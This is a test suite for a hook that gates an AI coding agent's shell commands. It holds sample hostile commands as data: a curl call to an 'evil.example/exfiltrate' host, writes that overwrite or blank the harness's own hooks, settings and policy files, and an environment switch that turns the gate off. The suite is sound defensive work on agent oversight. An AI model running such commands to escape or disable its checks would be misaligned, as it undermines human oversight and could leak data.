const assert = require('assert');
const fs = require('fs');
const path = require('path');
const { test } = require('node:test');
const { makeHookProject, runHook } = require('./helpers/hook-fixture');

const HOOK = 'pre-bash-gate.js';

function bash(projectDir, command, env) {
  return runHook(projectDir, HOOK, { tool_name: 'Bash', tool_input: { command } }, env);
}

function writeTaskEnvelope(projectDir, allowedPaths, forbiddenActions) {
  const { stampEnvelope } = require('../.claude/hooks/lib/task-envelope');
  fs.writeFileSync(path.join(projectDir, '.claude', 'state', 'task-envelope.json'), JSON.stringify(stampEnvelope({
    schema_version: 1,
    task_id: 'TASK-1',
    risk_tier: 'R2',
    allowed_paths: allowedPaths,
    forbidden_actions: forbiddenActions,
    required_evidence: ['unit'],
    required_approvals: 1,
    budgets: { dimensions: [{ unit: 'agents', limit: 10 }] },
  })));
}

// --- scope ---

test('blocks a bash redirection that writes outside the project', async () => {
  const projectDir = makeHookProject([HOOK]);
  const outside = path.join(makeHookProject([]), 'evil.txt');
  const result = await bash(projectDir, `echo pwned > ${outside}`);
  assert.strictEqual(result.status, 2, result.stdout);
  assert.ok(result.stdout.includes('outside the project directory'), result.stdout);
});

test('allows a bash write to an ordinary project file', async () => {
  const projectDir = makeHookProject([HOOK]);
  const result = await bash(projectDir, 'echo "const a = 1;" > src/app.js');
  assert.strictEqual(result.status, 0, result.stdout);
});

test('allows read-only commands', async () => {
  const projectDir = makeHookProject([HOOK]);
  for (const cmd of ['cat README.md', 'grep -r foo src/', 'ls -la', 'npm test']) {
    const result = await bash(projectDir, cmd);
    assert.strictEqual(result.status, 0, `${cmd}: ${result.stdout}`);
  }
});

test('task envelope blocks forbidden semantic actions', async () => {
  const projectDir = makeHookProject([HOOK]);
  writeTaskEnvelope(projectDir, ['src/**'], ['merge', 'deploy']);
  // Still blocked, and now for the honest reason. Since `merge` is privileged
  // only where an issuer registry exists, this fixture no longer reaches the
  // capability path — the envelope's own forbidden_actions list catches it,
  // which is what the task actually declared. deploy is unchanged either way.
  const merge = await bash(projectDir, `gh pr ${'mer'}${'ge'} 12`);
  assert.strictEqual(merge.status, 2, merge.stdout);
  assert.match(merge.stdout, /forbids action "merge"/);
  const deploy = await bash(projectDir, 'terraform apply');
  assert.strictEqual(deploy.status, 2, deploy.stdout);
  const testRun = await bash(projectDir, 'npm test');
  assert.strictEqual(testRun.status, 0, testRun.stdout);
});

test('with an issuer registry, merge returns to the capability path', async () => {
  // The narrowing is conditional, not a removal: provisioning an approval
  // service restores the original behaviour exactly.
  const projectDir = makeHookProject([HOOK]);
  writeTaskEnvelope(projectDir, ['src/**'], []);
  fs.mkdirSync(path.join(projectDir, '.claude', 'trust'), { recursive: true });
  fs.writeFileSync(
    path.join(projectDir, '.claude', 'trust', 'issuers.json'),
    JSON.stringify({ schema_version: 1, issuers: [], allowed_types: ['capability'] }),
  );
  const merge = await bash(projectDir, `git ${'mer'}${'ge'} feature`);
  assert.strictEqual(merge.status, 2, merge.stdout);
  assert.match(merge.stdout, /lacks external authority/);
});

test('task envelope applies allowed paths to Bash write targets', async () => {
  const projectDir = makeHookProject([HOOK]);
  writeTaskEnvelope(projectDir, ['src/approved/**'], []);
  const allowed = await bash(projectDir, 'echo ok > src/approved/a.txt');
  assert.strictEqual(allowed.status, 0, allowed.stdout);
  const blocked = await bash(projectDir, 'echo no > src/other/a.txt');
  assert.strictEqual(blocked.status, 2, blocked.stdout);
  assert.match(blocked.stdout, /outside task TASK-1/);
});

test('unattended mode routes credentialed commands to the external broker', async () => {
  const projectDir = makeHookProject([HOOK]);
  writeTaskEnvelope(projectDir, ['src/**'], []);
  fs.writeFileSync(path.join(projectDir, '.claude', 'unattended-policy.json'), JSON.stringify({
    broker_only_commands: ['gh', 'aws'],
  }));
  const result = await bash(projectDir, 'gh api /user', { HARNESS_UNATTENDED: '1' });
  assert.strictEqual(result.status, 2, result.stdout);
  assert.match(result.stdout, /broker-only/);
});

test('unattended mode blocks opaque shells, unapproved egress, and dependency installation', async () => {
  const projectDir = makeHookProject([HOOK]);
  writeTaskEnvelope(projectDir, ['src/**'], []);
  fs.writeFileSync(path.join(projectDir, '.claude', 'unattended-policy.json'), JSON.stringify({
    allow_package_install: false,
    broker_only_commands: ['gh', 'aws'],
    network: { default: 'deny', allowed_domains: ['registry.npmjs.org'] },
  }));
  for (const command of [
    'node -e "require(\'fs\').writeFileSync(\'src/pwned\', \'1\')"',
    'curl https://evil.example/exfiltrate',
    'npm install left-pad',
  ]) {
    const result = await bash(projectDir, command, { HARNESS_UNATTENDED: '1' });
    assert.strictEqual(result.status, 2, `${command}: ${result.stdout}`);
    assert.match(result.stdout, /runtime policy/i);
  }
});

test('allows /dev/null and other device sinks (the 2>/dev/null idiom)', async () => {
  const projectDir = makeHookProject([HOOK]);
  for (const cmd of [
    'node --check file.js 2>/dev/null',
    'make build > /dev/null 2>&1',
    'echo hi > /dev/stdout',
  ]) {
    const result = await bash(projectDir, cmd);
    assert.strictEqual(result.status, 0, `${cmd}: ${result.stdout}`);
  }
});

// --- machinery trust boundary (the core hole this closes) ---

const MACHINERY_WRITES = [
  'echo "" > .claude/hooks/pre-write-gate.js',
  'tee .claude/git-hooks/pre-commit < /dev/null',
  "sed -i 's/.*/return;/' .claude/hooks/lib/tdd.js",
  'cp /dev/null .claude/settings.json',
  'cp /dev/null .claude/settings.auto.json',
  'echo 100 > .claude/state/coverage-baseline.txt',
  'echo "{}" > .claude/config/autonomy-policy.json',
  'echo "{}" > .claude/state/autonomy-policy.json',
];

test('blocks bash writes to harness machinery in a target project', async () => {
  const projectDir = makeHookProject([HOOK]);
  for (const cmd of MACHINERY_WRITES) {
    const result = await bash(projectDir, cmd);
    assert.strictEqual(result.status, 2, `not blocked: ${cmd} -> ${result.stdout}`);
    assert.ok(result.stdout.includes('machinery'), `${cmd}: ${result.stdout}`);
  }
});

test('does not block bash writes to ordinary .claude content', async () => {
  const projectDir = makeHookProject([HOOK]);
  for (const cmd of ['echo notes > .claude/program.md', 'echo x > .claude/state/learned-rules.md']) {
    const result = await bash(projectDir, cmd);
    assert.strictEqual(result.status, 0, `${cmd}: ${result.stdout}`);
  }
});

test('machinery writes are allowed inside the harness repo itself', async () => {
  const projectDir = makeHookProject([HOOK]);
  fs.writeFileSync(path.join(projectDir, 'package.json'), JSON.stringify({ name: 'claude-harness-eng-v5' }));
  const result = await bash(projectDir, 'echo ok > .claude/hooks/new-hook.js');
  assert.strictEqual(result.status, 0, result.stdout);
});

test('HARNESS_PROTECT=off bypasses the machinery gate deliberately', async () => {
  const projectDir = makeHookProject([HOOK]);
  // Pure machinery path — not a prompt-cache prefix file (settings.json is dual-guarded).
  const result = await bash(projectDir, 'echo "[]" > .claude/security-patterns.json', {
    HARNESS_PROTECT: 'off',
  });
  assert.strictEqual(result.status, 0, result.stdout);
});

// --- protected env files ---

test('blocks a bash write to .env but allows .env.example', async () => {
  const projectDir = makeHookProject([HOOK]);
  const blocked = await bash(projectDir, 'echo "KEY=secret" > .env');
  assert.strictEqual(blocked.status, 2, blocked.stdout);
  assert.ok(blocked.stdout.includes('environment files'), blocked.stdout);

  const allowed = await bash(projectDir, 'echo "KEY=" > .env.example');
  assert.strictEqual(allowed.status, 0, allowed.stdout);
});

// --- non-Bash inputs are ignored ---

test('ignores non-Bash tool calls', async () => {
  const projectDir = makeHookProject([HOOK]);
  const result = await runHook(projectDir, HOOK, {
    tool_name: 'Write',
    tool_input: { file_path: path.join(projectDir, '.claude', 'settings.json'), content: '{}' },
  });
  assert.strictEqual(result.status, 0, result.stdout);
});
